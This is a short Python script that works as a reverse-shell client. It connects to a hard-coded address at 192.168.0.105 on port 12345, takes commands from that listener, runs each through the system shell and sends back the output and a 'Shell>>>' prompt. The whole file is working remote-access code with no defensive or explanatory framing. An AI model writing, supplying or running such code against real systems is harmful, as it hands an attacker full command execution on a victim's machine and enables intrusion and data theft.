import subprocess
import os
import sys
import socket

server_ip = "192.168.0.105"
server_port = 12345

s = socket.socket()
s.connect((server_ip,server_port))

#message = "Hallo, ich bin der Client"
#s.send(message.encode())

#cwd = os.getcwd()
#s.send(cwd.encode())
while True:
    command = s.recv(8192).decode("utf-8")
    if command.startswith("cd "):
        os.chdir(command[3:])
        s.sendall(b"Shell>>> ")
        continue
    if len(command) > 0:
        p = subprocess.run(command, shell=True, capture_output=True)
        data = p.stdout + p.stderr
        s.sendall(data + b"Shell>>> ")
